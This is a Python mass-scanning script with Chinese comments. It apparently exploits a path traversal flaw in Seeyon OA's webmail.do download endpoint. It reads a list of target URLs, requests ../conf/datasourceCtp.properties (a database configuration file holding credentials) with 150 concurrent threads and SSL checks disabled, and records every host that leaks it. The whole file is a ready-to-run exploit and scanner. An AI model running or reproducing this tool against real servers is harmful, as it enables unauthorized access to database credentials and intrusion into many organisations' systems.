import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import urllib3

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程锁
file_lock = threading.Lock()

def check_vulnerability(url):
    """
    检查单个URL是否存在漏洞
    """
    # 构建完整的POC URL
    poc_path = "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
    target_url = urljoin(url.rstrip('/') + '/', poc_path.lstrip('/'))
    
    try:
        # 发送请求，禁用SSL验证，不跟随重定向
        response = requests.get(
            target_url,
            verify=False,
            allow_redirects=False,
            timeout=10
        )
        
        status_code = response.status_code
        
        # 检查状态码
        if 300 <= status_code < 400:
            print(f"[INFO] {url} - 状态码 {status_code}，重定向，不存在漏洞")
            return None
        
        elif status_code == 200:
            # 检查响应内容是否包含 sqlserver://127.0.0.1
            response_text = response.text
            if "sqlserver://127.0.0.1" in response_text:
                result = f"[VULNERABLE] {target_url} - 存在漏洞 (状态码: {status_code}, 包含sqlserver://127.0.0.1)"
                print(f"[+] {result}")
                return result
            else:
                print(f"[INFO] {url} - 状态码 200，但不包含sqlserver://127.0.0.1")
                return None
        else:
            print(f"[INFO] {url} - 状态码 {status_code}，不存在漏洞")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] {url} - 请求失败: {str(e)}")
        return None
    except Exception as e:
        print(f"[ERROR] {url} - 发生错误: {str(e)}")
        return None

def write_to_file(filename, content):
    """
    使用线程锁安全地写入文件
    """
    with file_lock:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content + '\n')
            f.flush()  # 立即刷新缓冲区，确保数据写入磁盘

def main():
    # 读取URL列表
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[ERROR] 未找到url.txt文件")
        return
    except Exception as e:
        print(f"[ERROR] 读取url.txt文件失败: {str(e)}")
        return
    
    if not urls:
        print("[INFO] url.txt文件中没有URL")
        return
    
    print(f"[INFO] 开始检测 {len(urls)} 个URL，线程数: 150")
    print(f"[INFO] 使用的POC: /seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties")
    print(f"[INFO] 检测条件: 状态码200且响应包含sqlserver://127.0.0.1")
    
    # 清空结果文件
    with open('result.txt', 'w', encoding='utf-8') as f:
        f.write("漏洞检测结果 (POC: /seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties)\n")
        f.write("检测条件: 状态码200且响应包含sqlserver://127.0.0.1\n")
        f.write("=" * 80 + "\n")
    
    # 使用线程池并发执行
    with ThreadPoolExecutor(max_workers=150) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        
        # 处理完成的任务
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                if result:
                    # 发现漏洞，立即写入文件
                    write_to_file('result.txt', result)
            except Exception as e:
                print(f"[ERROR] 处理 {url} 时发生异常: {str(e)}")
    
    print("[INFO] 检测完成，结果已保存到 result.txt")

if __name__ == "__main__":
    main()